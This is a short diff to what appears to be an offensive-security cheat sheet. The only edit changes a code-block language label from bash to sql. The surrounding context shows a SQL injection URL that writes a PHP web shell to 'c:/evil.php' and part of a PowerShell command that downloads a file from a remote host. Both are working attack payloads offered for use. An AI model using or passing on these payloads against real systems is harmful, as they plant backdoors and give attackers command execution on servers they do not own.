@@ -169,7 +169,7 @@ powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://$
 ```
 
 #### SQL Injection to Shell or Backdoor
-```bash
+```sql
 # Assumed 3 columns
 http://target/index.php?vulnParam=0' UNION ALL SELECT 1,"<?php system($_REQUEST['cmd']);?>",2,3 INTO OUTFILE "c:/evil.php"-- uMj
 ```
